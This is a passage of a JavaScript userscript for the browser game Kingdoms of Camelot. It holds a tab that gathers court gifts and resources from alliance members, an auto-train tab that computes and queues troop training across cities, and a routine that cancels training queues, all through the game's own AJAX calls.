		document.getElementById('resDiv').innerHTML = '<div class=pdxStat>'+culang.Hvisitnowcourts+'</div><DIV id=rsltDiv style="height:600px; max-height:750px"><BR><B><u>'+culang.GTOacceptgift+' '+culang.from+' <span class=boldGreen>'+ t.doList.length +'</span> '+culang.player+':</u></b></div>';    
		t.acceptNext ();
	  },

  allDone : function (msg){
    var t = Tabs.Resources;
	msg += '<BR><BR> <b><u>'+culang.res+'</u></b> <BR>\
		   '+culang.gold+': '+addCommas(t.total.gold)+'<BR>';
	for(var i=1; i<=4; i++){
		msg += t.resource[i]+': '+addCommas(t.total[i])+'<BR>';
	}
    document.getElementById('rsltDiv').innerHTML += '<BR><BR>' + msg;
    document.getElementById('pballlist').value = ''+culang.srcplayr+'';
    t.accepting = false;
  },
  
    
  acceptNext : function (){
    var t = Tabs.Resources;
    var gift = t.doList.shift();
    if (gift == null){
      t.allDone ('<b>'+culang.acceptresdone+'</b>');
      return;
    }
    var acpDiv = document.getElementById('rsltDiv');
    var curDiv = document.createElement ('div');
    acpDiv.appendChild (curDiv);
    curDiv.innerHTML = '<B>'+culang.from+' <b>'+ gift.name +'</b>: ';    
    var statSpan = document.createElement ('span');
    curDiv.appendChild (statSpan);
    statSpan.innerHTML = '<i>'+culang.accept+'... </i>';
    t.getCourtAction (gift, gotGiftData);
        
    function gotGiftData (rslt){ //logit ("getErDone.gotGiftData ... \n"+ inspect (gift, 8, 1));
      if (!t.accepting)
        return;
      if (rslt.ok){
        var msg = ' <span class=boldGreen>'+ rslt.gold +'</span> '+culang.actionGold1+' <span class=boldGreen>'+rslt.resource +'</span> '+ t.resource[rslt.resourcetype]+'&nbsp; &nbsp; <b><font color=green>'+culang.actionGold2+'</font></b>.';
		actionLog ('<b>'+culang.auto+' '+culang.res+'</b>: '+culang.actionresa+' <b>'+gift.name+'</b>: <span class=boldGreen>'+ rslt.gold +'</span> '+culang.actionGold4+' <span class=boldGreen>'+ rslt.resource +' </span>'+ t.resource[rslt.resourcetype]);
        statSpan.innerHTML += msg;
		t.total.gold += rslt.gold;
		t.total[rslt.resourcetype] += rslt.resource;
		t.acceptNext ();  
        return;
      }
        
      if (rslt.msg)
        msg = '<B>'+ rslt.msg + '</b>';
      else
        msg = '<SPAN class=boldRed>'+culang.Herror+': '+ rslt.ajaxErr +'</span>';

      curDiv.removeChild (statSpan);
      curDiv = document.createElement ('div');
      curDiv.className = 'indent25';
      acpDiv.appendChild (curDiv);
      curDiv.innerHTML = msg;
      t.acceptNext ();  
    }
    
  },

  getMembersInfo : function (pageNo, notify) {
    var t = Tabs.Resources;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    
    params.pageNo = pageNo;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/allianceGetMembersInfo.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify ({errMsg:'Ajax Comm Error'});
      },
    });
  },
  
  getDailyAction : function (uid, notify){
	var t = Tabs.Resources;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    
    params.pid = uid;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/viewCourt.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify ({errMsg:'Ajax Comm Error'});
      },
    });
  },
  
  getCourtAction : function (gift, notify){
	var t = Tabs.Resources;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    
    params.atype = Options.getResType;
	params.toid = gift.userId;
	params.givercityid = t.city.id;
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/courtDoAction.php" + unsafeWindow.g_ajaxsuffix, {
      method: "post",
      parameters: params,
      onSuccess: function (rslt) {
        notify (rslt);
      },
      onFailure: function (rslt) {
        notify ({errMsg:'Ajax Comm Error'});
      },
    });
  },
  
  checkDailyAction : function (userList, notify){
	var t = Tabs.Resources;
	var count = 0;
    t.getDailyAction(userList[count].userId, parseViewCourt);
	
	function parseViewCourt (rslt){
		if (!rslt.ok || rslt.errMsg)
			notify ({errMsg:'Ajax Comm Error'});
		if(rslt.dailyActionFlag == 0)
			t.users.push(userList[count]);
		t.progress(count, 'pbResUserAvailCount');
		count++;
		if(count < userList.length){
			t.getDailyAction(userList[count].userId, parseViewCourt);
		} else {
			notify();
		}
	}
  },
 
  fetchUserList : function (notify){  // notify with gifts[] or: {errMsg:xxx}
	var t = Tabs.Resources;
	var userList = [];
    t.getMembersInfo(1, parseAlliancePage);
	
    function parseAlliancePage (rslt){
      if (!rslt.ok || rslt.errMsg)
        notify ({errMsg:'Ajax Comm Error'});
	  var users = rslt.memberInfo;
      for(var k in users){
		userList.push({userId:users[k].userId, name:users[k].name, might:users[k].prestige, type:'alliance'});
	  }
	  t.progress(userList.length, 'pbResUserListCount');
	  if(rslt.currentPage < rslt.noOfPages){
		t.getMembersInfo((rslt.currentPage+1), parseAlliancePage);
	  } else {
		notify(userList);
	  }
    }
	
  },
},
/***********************************************************************************/
/************ KOC POWER - TABS AUTOTRAIN ******************************************/
/*********************************************************************************/
Tabs.AutoTrain= {
	tabOrder: StyleOptions.toKaserne,
	tabLabel: culang.autotrain,
	cont : null,
	nbfil : 0,
	crfil : 0,
	timer:null,
	city : 0,
	numcity :-1,

  init : function (div){
	   var t = Tabs.AutoTrain;
	   t.cont = div;
	   t.cont.innerHTML = '';

  
      unsafeWindow.changeUnitType = t.ATchangeUnits;
    m = "<DIV class=pdxStat>"+culang.Hatrain+"</div>";
    m += "<TABLE width=720 class=pdxTab border=0 align=center><tr align=center valign=top><TD>"+culang.intervall+": <input id=aFtimelauch type=text size=2 value='"+parseInt(AutoTrainOptions.timelauch)+"'> "+culang.DFintervall2+"</td><TD>"
    if (AutoTrainOptions.Running == false) {
       m += '<INPUT id=pbAutoTrainState  type=submit value="'+culang.autotrain+' = '+culang.buttonoff+'">';
    } else {
       m += '<INPUT id=pbAutoTrainState  type=submit value="'+culang.autotrain+' = '+culang.buttonon+'">';
	   t.timer=setInterval(t.Start,parseInt(AutoTrainOptions.timelauch*1000));
    }
				
    m+="</td><TD><input type=button  value='"+culang.save+"' id=autoTrainSave></td></tr></table>";
     m += "<TABLE width=100% class=pdxTab border=0 align=center cellspacing=0 cellpadding=3><tr align=left><td align=left style='border-bottom:1px solid black' colspan=2></td><td  align=left style='border-bottom:1px solid black'><b><u>"+culang.holyplace+"</u></b></td><td align=left style='border-bottom:1px solid black'><b><u>"+culang.troops+"</u></b></td><td  align=left style='border-bottom:1px solid black'><b><u>"+culang.min+"</u></b></td><td  align=left style='border-bottom:1px solid black'><b>"+culang.max+"</b></td><td align=left style='border-bottom:1px solid black' colspan=2><b><u>"+culang.worker+"</u></b></td><tD  align=left style='border-bottom:1px solid black'><b><u>"+culang.speedups+"</u></b></td><td  align=center style='border-bottom:1px solid black'><b><u>"+culang.actionNote+"</u></b></td></tr>";
    var city=0;
    for (var c=0; c<Cities.numCities; c++) {
     cityId=Cities.cities[c].id;  
     city = c+1;
     m+="<tr><td rowspan=2 width=6% align=right style='border-bottom:1px solid black'><b>"+(c+1)+"</b></td><td align=right rowspan=2 style='border-bottom:1px solid black'>";
     if (AutoTrainOptions.listactif && AutoTrainOptions.listactif[cityId] == false) {
      m+="<input type=checkbox id='autoFCheck_"+cityId+"'>";
     }else {
      m+="<input checked type=checkbox id='autoFCheck_"+cityId+"'>";
     }
     m+="</td><td width=15% align=center  >"+Cities.cities[c].name+"</td><TD align=center><SELECT id='autoFType_"+cityId+"' onchange='changeUnitType("+cityId+",this.value);'>";
     for (r=1; r<13; r++){
      var faux = 0;
      var uc = unsafeWindow.unitcost['unt'+r];
      if (matTypeof(uc[8]) == 'object'){
            for (k in uc[8]){  // check building requirement
              var b = getCityBuilding (cityId, k.substr(1));
              if (b.maxLevel < uc[8][k][1]){
                faux = 1;
                break;
              }
            }
          }
          if (matTypeof(uc[9]) == 'object'){
            for (k in uc[9]){    // check tech requirement
              if (parseInt(Seed.tech['tch'+k.substr(1)]) < uc[9][k][1]){
 	       faux = 1;
                break;
              }
            }
         }
       if (faux==0) {
	if (AutoTrainOptions.list) {
	   if (r==AutoTrainOptions.list[cityId]) {
		     	               m+= "<option selected value='"+r+"'>"+unsafeWindow.unitcost['unt'+r][0]+"</option>";
           } else {
		     	               m+= "<option value='"+r+"'>"+unsafeWindow.unitcost['unt'+r][0]+"</option>";
	   }
	}else{
	   if (r==2) {
	               m+= "<option selected value='"+r+"'>"+unsafeWindow.unitcost['unt'+r][0]+"</option>";
	              } else {
	               m+= "<option value='"+r+"'>"+unsafeWindow.unitcost['unt'+r][0]+"</option>";
				}
			}
		} 
    } 
    if (AutoTrainOptions.unitemax[Cities.cities[c].id] == undefined) AutoTrainOptions.unitemax[Cities.cities[c].id] = 999999;
    if (isNaN(parseInt(AutoTrainOptions.unitemin[cityId]))) AutoTrainOptions.unitemin[cityId]=0 ;
    if (AutoTrainOptions.Keep[city] == undefined) AutoTrainOptions.Keep[city] ={};
    m+= "</select></td><td align=left><input type=text value='"+ parseInt(AutoTrainOptions.unitemin[cityId]) +"' id='aFunitemin_"+cityId+"' size=4></td><td align=left><input type=text value='"+ parseInt(AutoTrainOptions.unitemax[cityId]) +"' id='aFunitemax_"+cityId+"' size=5></td><td align=right>";
    
        if (AutoTrainOptions.listlabour && AutoTrainOptions.listlabour[cityId] == false) {
         m+="<input type=checkbox id='autoFWorkers_"+cityId+"'>";
        }else {
         m+="<input checked type=checkbox id='autoFWorkers_"+cityId+"'>";
    }
	m+="</td><td align=right>";
	m+='<SELECT class='+city+' id="workers'+city+'"><option value="0">0%</options>';
	m+='<option value="25">25%</options>';
	m+='<option value="50">50%</options>';
	m+='<option value="75">75%</options>';
	m+='<option value="100">100%</options>';
	m+="</td><td align=right>";
	m+="<select id='autoFboost_"+cityId+"'>";
	m+="<option value=0>"+culang.OwideOptnormal+"</option><option value=1 "+ (AutoTrainOptions.listboost[cityId]==1?'SELECTED ':'') +">5-15%</option><option value=2 "+ (AutoTrainOptions.listboost[cityId]==2?'SELECTED ':'') +">10-25%</option></select>";
	m+="</td><td align=right width=40%><span id='autoFError_"+cityId+"'></span></td></tr>"; 
	m+='<TR><td style="border-bottom:1px solid black"><SELECT class='+city+' id="Resource'+city+'" disabled><option value="true">'+culang.keeps+'</options>';
	m+='<option value="false">'+culang.use+'</option>';
	m+='</select><td colspan=6  style="border-bottom:1px solid black"><img width=23 src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/food_30.png">&nbsp;';
	m += '<INPUT class='+city+'  id="KeepFood'+city+'" type=text size=7 maxlength=8 value="'+ AutoTrainOptions.Keep[city]['Food']+'"\>&nbsp;';
	m += '<img width=23 src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/wood_30.png">&nbsp;';
	m += '<INPUT class='+city+' id="KeepWood'+city+'" type=text size=7 maxlength=8 value="'+ AutoTrainOptions.Keep[city]['Wood']+'"\>&nbsp;';
	m += '<img width=23 src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/stone_30.png">&nbsp;';
	m += '<INPUT class='+city+'  id="KeepStone'+city+'" type=text size=7 maxlength=8 value="'+ AutoTrainOptions.Keep[city]['Stone']+'"\>&nbsp;';
	m += '<img width=23 src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/iron_30.png">&nbsp;';
	m += '<INPUT class='+city+' id="KeepOre'+city+'" type=text size=7 maxlength=8 value="'+ AutoTrainOptions.Keep[city]['Ore']+'"\>&nbsp;';
	m += '</td><td  style="border-bottom:1px solid black"></td></tr>';
    }
    m+="</table><table width=100% class=pdxTab border=0><tr><td>";
	
	    m+="&nbsp;<INPUT id=autoTrainModes type=submit value='"+culang.mode+"'> <select id=TrainMode>";
    for (r=2; r<13; r++){
     m+= "<option value='"+r+"'>"+unsafeWindow.unitcost['unt'+r][0]+"</option>";
    }
    m+="</select> - "+culang.predefinedTrain+": <select id=AutoTrainMode><option value=25>25%</option><option value=50>50%</option><option value=75>75%</option><option value=100>100%</option></select> - <input type=button value='"+culang.filltroops+"' id=AllCalculate>";	   
    m+="<BR><input type=checkbox id=AutoTrainCancelFirst> "+culang.cancelTraining+" - <input type=button value='"+culang.cancelTR+"' id=ATCancelAll> <span id='AutoTrainLog'></span></td></tr></table>";
	
    t.cont.innerHTML = m; 
    for (i=0;i<Seed.cities.length;i++){
            city = i+1;
            document.getElementById('Resource'+city).value = AutoTrainOptions.Resource[city];
            document.getElementById('workers'+city).value = AutoTrainOptions.Workers[city];     
    }
    document.getElementById('AutoTrainMode').value=AutoTrainOptions.UnitMixValue;
    document.getElementById('AutoTrainMode').addEventListener('change', function(e){
      AutoTrainOptions.UnitMixValue=document.getElementById('AutoTrainMode').value;
      saveAutoTrainOptions();
    },false);
    document.getElementById('AllCalculate').addEventListener('click', function(){
        for (var c=0; c<Cities.numCities; c++) {
     		cityId=Cities.cities[c].id; 
                t.ATchangeUnits(cityId,document.getElementById("autoFType_"+cityId).value);          
      	}
    } , false);

	
	    document.getElementById('pbAutoTrainState').addEventListener('click', function(){
		t.toggleAutoTrainState(this);
    }, false);
	
    document.getElementById('autoTrainSave').addEventListener('click', t.saveATrainOpt , false);
    document.getElementById('autoTrainModes').addEventListener('click', function(){t.predefinedTrainMode()} , false);
    document.getElementById('ATCancelAll').addEventListener('click', function(){t.AT_CancelAll()} , false);
    t.dispStatus = document.getElementById('AutoTrainLog');
	
    var k=0;
    	 for (var c=0; c<Cities.numCities; c++) {
    	  k=c+1;
    	 	document.getElementById('workers'+k).addEventListener('change', function(e){
	      	    AutoTrainOptions.Workers[e.target['className']] = e.target.value;
	      	    saveAutoTrainOptions();
	      	    
      	}, false);
    	document.getElementById('Resource'+k).addEventListener('change', function(e){
    			AutoTrainOptions.Resource[e.target['className']] = e.target.value;
         		saveAutoTrainOptions();
		}, false);
		document.getElementById('KeepFood'+k).addEventListener('change', function(e){
			if (isNaN(e.target.value)) e.target.value=0 ;
            AutoTrainOptions.Keep[e.target['className']]['Food'] = e.target.value;
            saveAutoTrainOptions();
      	}, false);
      	document.getElementById('KeepWood'+k).addEventListener('change', function(e){
      	    if (isNaN(e.target.value)) e.target.value=0 ;
            AutoTrainOptions.Keep[e.target['className']]['Wood'] = e.target.value;
            saveAutoTrainOptions();
      	}, false);
      	document.getElementById('KeepStone'+k).addEventListener('change', function(e){
			if (isNaN(e.target.value)) e.target.value=0 ;
            AutoTrainOptions.Keep[e.target['className']]['Stone'] = e.target.value;
            saveAutoTrainOptions();
      	}, false);
      	document.getElementById('KeepOre'+k).addEventListener('change', function(e){
      	    if (isNaN(e.target.value)) e.target.value=0 ;
            AutoTrainOptions.Keep[e.target['className']]['Ore'] = e.target.value;
            saveAutoTrainOptions();
      	}, false);
    } 
  
	 },
 Start: function() {
  var t = Tabs.AutoTrain;
  if (!AutoTrainOptions.Running) {
  
    clearInterval(t.timer);
    return;
  }

  if (t.numcity<Cities.numCities-1) {
      t.numcity++;
    } else {
     t.numcity=0; 
  }
  var c=t.numcity;
  var cityId=Cities.cities[c].id;
  if (!AutoTrainOptions.listactif[cityId]) t.Start();
  var populationdispo = 0;
  if(!AutoTrainOptions.listlabour[cityId]) {
   populationdispo = parseInt(Seed.citystats['city'+cityId].pop[0]) - parseInt(Seed.citystats['city'+cityId].pop[3]);	
  }else {
    populationdispo = parseInt(Seed.citystats['city'+cityId].pop[0]).toFixed(0);
  }
  var availableTrainingSlots = 0;
  try{
   	var barracksTotal = getCityBuilding(cityId, 13).count;
   	var trainingSlotsUsed = Seed.queue_unt['city'+cityId].length;
   	if(trainingSlotsUsed!=null){
   		var availableTrainingSlots = barracksTotal-trainingSlotsUsed;
   	}
   }finally{
	
   } 
   maxunite = t.unitemax(cityId, AutoTrainOptions.list[Cities.cities[c].id],(c+1));
   var resources = t.checkresources(cityId, c);
   if (!resources) {
    if (document.getElementById('autoFError_'+cityId)) document.getElementById('autoFError_'+cityId).innerHTML ="<span title='"+culang.pop+": "+populationdispo+" - "+culang.max+" "+culang.troops+": "+maxunite+" - "+culang.TTleftslots+": "+availableTrainingSlots+"'>\
      <b>"+culang.notEnaughResource+"</b></span>";
    return;
   }  
   
   if(availableTrainingSlots>0 && maxunite>=parseInt(AutoTrainOptions.unitemin[Cities.cities[c].id]) && AutoTrainOptions.listactif[Cities.cities[c].id]) {
   
       var unitId = AutoTrainOptions.list[cityId];
       
       var num = parseInt(maxunite);
       if (AutoTrainOptions.unitemax[Cities.cities[c].id] != undefined) {
        var maxnum = AutoTrainOptions.unitemax[Cities.cities[c].id];
        if (num>parseInt(AutoTrainOptions.unitemax[Cities.cities[c].id])) num=parseInt(AutoTrainOptions.unitemax[Cities.cities[c].id]);
       }
       if (document.getElementById('autoFError_'+cityId)) document.getElementById('autoFError_'+cityId).innerHTML=" "+num+" "+unsafeWindow.unitcost['unt'+ AutoTrainOptions.list[Cities.cities[c].id]][0]+"";
      //if (document.getElementById('autoFError_'+cityId)) actionLog('Lancement '+num+' '+unsafeWindow.unitcost['unt'+ AutoTrainOptions.list[Cities.cities[c].id]][0]+' ');

       var gam= AutoTrainOptions.listboost[cityId];
    
       var time = unsafeWindow.modal_barracks_traintime(unitId, num);
         var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
         params.cid = cityId;
         params.type = unitId;
         params.quant = num;
         params.items = 0;
         params.gambleId = gam;
         new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/train.php" + unsafeWindow.g_ajaxsuffix, {
           method: "post",
           parameters: params,
           onSuccess: function(rslt) {
             if (rslt.ok) {
               
               var resourceFactors=[],resourceLost;
	              if(gam!=null){
	                time=rslt.timeNeeded;
	       	      }
	               for(var i=1;i<5;i++){
	               if(rslt.gamble){
	                resourceFactors.push(rslt.gamble[i.toString()]);
	               }else{
	               resourceFactors.push(1);
	               }
					resourceLost=parseInt(unsafeWindow.unitcost["unt"+unitId][i])*3600*parseInt(num);resourceLost=resourceLost*resourceFactors[i-1];
					unsafeWindow.seed.resources["city"+cityId]["rec"+i][0]=parseInt(unsafeWindow.seed.resources["city"+cityId]["rec"+i][0])-resourceLost;
					}
					unsafeWindow.seed.citystats["city"+cityId].gold[0]=parseInt(unsafeWindow.seed.citystats["city"+cityId].gold[0])-parseInt(unsafeWindow.unitcost["unt"+unitId][5])*parseInt(num);
					unsafeWindow.seed.citystats["city"+cityId].pop[0]=parseInt(unsafeWindow.seed.citystats["city"+cityId].pop[0])-parseInt(unsafeWindow.unitcost["unt"+unitId][6])*parseInt(num);
					unsafeWindow.seed.queue_unt["city"+cityId].push([unitId,num,rslt.initTS,parseInt(rslt.initTS)+time,0,time,null]);
			 
				if(rslt.updateSeed) { unsafeWindow.update_seed(rslt.updateSeed) }
	
               if (document.getElementById('autoFError_'+cityId)) document.getElementById('autoFError_'+cityId).innerHTML+=" <BR><span class=boldGreen>"+culang.actionGold2+"</span>";
             } else {
              if (document.getElementById('autoFError_'+cityId)) document.getElementById('autoFError_'+cityId).innerHTML+=" <BR><span class=boldRed>"+culang.error+"</span>";
             }
           },
           onFailure: function(o) {
            if (document.getElementById('autoFError_'+cityId)) document.getElementById('autoFError_'+cityId).innerHTML+=" <BR><span class=boldRed>"+culang.error+"</span>";
           }
  	});
       
   } else {
     if (document.getElementById('autoFError_'+cityId)) document.getElementById('autoFError_'+cityId).innerHTML =" <span title='"+culang.pop+": "+populationdispo+" - "+culang.max+" "+culang.troops+": "+maxunite+" - "+culang.TTleftslots+": "+availableTrainingSlots+"'><BR><span class=boldRed>"+culang.notpossible+"</span></span>";
   }

 },
 unitemax : function(currentcityid, e, numcity){

 var gamble = AutoTrainOptions.listboost[currentcityid];
 var mult=1;
 if (gamble==0) mult=1;
 if (gamble==1) mult=2;
 if (gamble==2) mult=4;
 var b=new Array();
 var a=new Array();
 for(var d=1;d<5;d++){
  b.push((parseInt(unsafeWindow.unitcost["unt"+e][d])*3600)*mult);
  a.push(parseInt(unsafeWindow.seed.resources["city"+currentcityid]["rec"+d][0]))
 }
  b.push((parseInt(unsafeWindow.unitcost["unt"+e][5]))*mult);
  a.push(parseInt(unsafeWindow.seed.citystats["city"+currentcityid].gold[0]));
  b.push((parseInt(unsafeWindow.unitcost["unt"+e][6])));

  if (!AutoTrainOptions.listlabour[currentcityid]) {
    a.push(parseInt(unsafeWindow.seed.citystats["city"+currentcityid].pop[0])-parseInt(unsafeWindow.seed.citystats["city"+currentcityid].pop[3]));
  } else {
    a.push(parseInt(unsafeWindow.seed.citystats["city"+currentcityid].pop[0])-parseInt(unsafeWindow.seed.citystats["city"+currentcityid].pop[3])+ parseInt((parseInt(unsafeWindow.seed.citystats["city"+currentcityid].pop[3])*(AutoTrainOptions.Workers[numcity]/100))));
  }  
  var c=a[0]/b[0];
  for(var d=1;d<b.length;d++)
  {
    if(parseInt(b[d])!=0){
     c=Math.min(c,a[d]/b[d])
    }
  }
  return parseInt(c)||0
 },
  getContent : function (){
    var t = Tabs.AutoTrain;
    return t.cont;
  },
  hide : function (){
    var t = Tabs.AutoTrain;
    t.saveATrainOpt();
  },
  ATchangeUnits: function(cityId,unit) {
   var t = Tabs.AutoTrain;
   var countpop= unsafeWindow.unitcost['unt'+unit][6];
   var numcity=Cities.byID[cityId].idx+1;
   var X = Seed.citystats['city'+cityId]["pop"][1];
   var Y = unsafeWindow.seed.citystats["city"+cityId].pop[3];
   var Q= countpop;
   var Z = 0;
   var M = document.getElementById("AutoTrainMode").value/100;
   if (document.getElementById("autoFWorkers_"+cityId).checked) {
      
      Z = AutoTrainOptions.Workers[numcity]/100;     
      document.getElementById("aFunitemax_"+cityId).value = parseInt(X/Q);

   } else {
    Z = 0;
    document.getElementById("aFunitemax_"+cityId).value=(X-Y)/Q;
   }
   var Min =((X-(Y*(1-Z)))*M)/Q;
   
   document.getElementById("aFunitemin_"+cityId).value = parseInt(Min);
   
   
  },
  show : function (){  
    var t = Tabs.AutoTrain;
	
  },
    checkresources : function(cityId, city){
  	var t = Tabs.AutoTrain;
  	var city=city+1;
  	t.food = parseInt((Seed.resources['city'+cityId].rec1[0]/3600) - AutoTrainOptions['Keep'][city]['Food']);
  	t.wood = parseInt((Seed.resources['city'+cityId].rec2[0]/3600) - AutoTrainOptions['Keep'][city]['Wood']);
  	t.stone = parseInt((Seed.resources['city'+cityId].rec3[0]/3600) - AutoTrainOptions['Keep'][city]['Stone']);
  	t.ore = parseInt((Seed.resources['city'+cityId].rec4[0]/3600) - AutoTrainOptions['Keep'][city]['Ore']);
  	if(t.food>0 && t.wood>0 && t.stone>0 && t.ore>0){
  		return true;
  	}
  	return false;
  },
  CancelActionall: function(numville, num, fintraitement) {
    
     var t = Tabs.AutoTrain;
  
     var cityId = Cities.cities[numville].id;
     var q = Seed.queue_unt['city'+cityId];
     var now = unixTime();
     
     start = q[num][2];
     end = q[num][3];
     if (first)
           actual = end - now;
        else
            actual = end - lastEnd;
     if (actual < 0)
            actual = 0;
       
     var param2=cityId; // id de la ville
     var param3=q[num][0]; // Type de trouoe
     var param4=q[num][1]; // Qte troupe
     var param5=end; // debut
     var param6=start; // fin
     var param7=actual; // duree
        
     var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
          params.cityId = param2;
          params.requestType ="CANCEL_TRAINING";
          params.numtrptrn = param4;
          params.trnETA= param5;
          params.trnNeeded = param7;
          params.trnTmp = param6;
          params.typetrn= param3;
      
       new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/cancelTraining.php" + unsafeWindow.g_ajaxsuffix, {
               method: "post",
               parameters: params,
             onSuccess: function (rslt) {
              var t = Tabs.AutoTrain;
              if (rslt.ok) {
                 unsafeWindow.update_seed_ajax(true,function(){
     	       var k=0;for(var j=0;j<unsafeWindow.seed.queue_unt["city"+param2].length;j++){
     	        if(j>num){
     	         unsafeWindow.seed.queue_unt["city"+param2][j][2]=parseInt(rslt.dateTraining[k]["start"]);
     	         unsafeWindow.seed.queue_unt["city"+param2][j][3]=parseInt(rslt.dateTraining[k]["end"]);
     	         k++;
     	         }
     	        }
     	        unsafeWindow.seed.queue_unt["city"+param2].splice(num,1);
     	        for(var i=1;i<5;i++){
     	         var totalReturn=parseInt(unsafeWindow.unitcost["unt"+param3][i])*parseInt(param4)*3600/2;
     	         unsafeWindow.seed.resources["city"+param2]["rec"+i][0]=parseInt(unsafeWindow.seed.resources["city"+param2]["rec"+i][0])+totalReturn;
     	        }
     
         	});
                t.crfil++;
  
  		// progression :
  		document.getElementById('AutoTrainLog').innerHTML = "<b><i>"+culang.que+": " + t.crfil+ " / " +t.nbfil +"</i></b>";
  
  	        var numnew = num - 1;
  	        if (numnew<fintraitement) {
		  		 if (numville==Cities.numCities) {
		  		  document.getElementById('AutoTrainLog').innerHTML = "<font color=#880000><B>"+culang.starttournamenttrain+"</b></font>";
		  		  return;
		  		 }
		  		 numville++;
		  		   		 var cityId = Cities.cities[numville].id;
				 		 var q = Seed.queue_unt['city'+cityId];
				   		 numnew=q.length-1;
				   		if (q.length<=fintraitement) {
				   		 document.getElementById('AutoTrainLog').innerHTML = "<font color=#550000><B>"+culang.tryagain+"</b></font>";
				   		 return;
		  		}
		  		 setTimeout(function (){
				    t.CancelActionall(numville, numnew, fintraitement);
		  		 }, (Math.random()*100)+100 );
		  	        } else {
		  	          setTimeout(function (){
		  	            t.CancelActionall(numville, numnew, fintraitement);
		  		  }, (Math.random()*100)+100 );
                 } 
               
              } else {
               document.getElementById('AutoTrainLog').innerHTML = "<font color=#550000><B>"+culang.canttrainRefresh+"</b></font>";
              }
             },
             onFailure: function (rslt) {
              var t = Tabs.AutoTrain;
              document.getElementById('AutoTrainLog').innerHTML = "<font color=#550000><B>"+culang.canttrainRefresh+"</b></font>";
             }
      });
      
  },
  AT_CancelAll: function() {
   var t = Tabs.AutoTrain;
   t.nbfil=0;
   t.crfil=0;
   var debutsup = 1;
   if ( document.getElementById('AutoTrainCancelFirst').checked) {  
    var debutsup=0 ;
   }
    for(i=0; i<Cities.numCities; i++) {
     var cityId = Cities.cities[i].id;
     var q = Seed.queue_unt['city'+cityId];
     t.nbfil += q.length - debutsup;
    }
   for(i=0; i<Cities.numCities; i++) {
    var cityId = Cities.cities[i].id;
    var q = Seed.queue_unt['city'+cityId];
    if (q.length>debutsup) {
     obj = document.getElementById('pbAutoTrainState');
     AutoTrainOptions.Running = false;
     if (obj) obj.value =  culang.autotrain+" = "+culang.buttonoff;
     saveAutoTrainOptions();
    t.CancelActionall(i, q.length-1, debutsup);
     //actionLog("Auto Ausbildung abgebrochen bei "+i + " / " + t.nbfil + " - Warteschlange #"+ (q.length-1) +" - "+ debutsup);
     return false;
    }
   }
  },
  predefinedTrainMode: function() {
   var t = Tabs.AutoTrain;
   var typeunit = document.getElementById('TrainMode').value;
   var countpop= unsafeWindow.unitcost['unt'+typeunit][6];
   for (var c=0; c<Cities.numCities; c++) {    
    cityId=Cities.cities[c].id;  
    document.getElementById("autoFCheck_"+Cities.cities[c].id).checked=true;
    document.getElementById("autoFType_"+Cities.cities[c].id).value=typeunit;
    var pop = parseInt(parseInt(Seed.citystats['city'+cityId]["pop"][1]/countpop) / document.getElementById("AutoTrainMode").value);
    document.getElementById("autoFWorkers_"+Cities.cities[c].id).checked=true;
	t.ATchangeUnits(cityId,document.getElementById("autoFType_"+cityId).value);
   }
   t.saveATrainOpt();
  },
  saveATrainOpt: function() {
     var t = Tabs.AutoTrain;
     document.getElementById('autoTrainSave').style.backgroundColor="#F18888";
     AutoTrainOptions.timelauch=document.getElementById('aFtimelauch').value;
     AutoTrainOptions.UnitMixValue=document.getElementById('AutoTrainMode').value;
     for (var c=0; c<Cities.numCities; c++) {
        AutoTrainOptions.list[Cities.cities[c].id] = document.getElementById('autoFType_'+Cities.cities[c].id).value;
        AutoTrainOptions.listactif[Cities.cities[c].id] = document.getElementById('autoFCheck_'+Cities.cities[c].id).checked;
        AutoTrainOptions.listlabour[Cities.cities[c].id] = document.getElementById('autoFWorkers_'+Cities.cities[c].id).checked;
        AutoTrainOptions.unitemin[Cities.cities[c].id]=document.getElementById('aFunitemin_'+Cities.cities[c].id).value;
        AutoTrainOptions.unitemax[Cities.cities[c].id]=document.getElementById('aFunitemax_'+Cities.cities[c].id).value;
        AutoTrainOptions.listboost[Cities.cities[c].id]=document.getElementById('autoFboost_'+Cities.cities[c].id).value;
     }
     saveAutoTrainOptions();
     setTimeout(function() {
     document.getElementById('autoTrainSave').style.backgroundColor="";
     }, 600);
  },
toggleAutoTrainState: function(obj){
	var t = Tabs.AutoTrain;
    if (AutoTrainOptions.Running == true) {
        AutoTrainOptions.Running = false;
		clearInterval(t.timer);
        obj.value = culang.autotrain+" = "+culang.buttonoff;
		saveAutoTrainOptions();
    } else {
        AutoTrainOptions.Running = true;
		t.timer=setInterval(t.Start,parseInt(AutoTrainOptions.timelauch*1000));
        obj.value = culang.autotrain+" = "+culang.buttonon;
		saveAutoTrainOptions();
    }
    saveAutoTrainOptions();
  },

}
/***********************************************************************************/
/************ KOC POWER - TABS CHAT ***********************************************/
/*********************************************************************************/
Tabs.Chat = {
  tabOrder : StyleOptions.toChat,
  tabLabel : culang.chat,
  myDiv : null,
  timer : null,  
  
  init : function (div){
    var t = Tabs.Chat;
    t.myDiv = div;
    unsafeWindow.pbviewtroops = t.viewtroops;
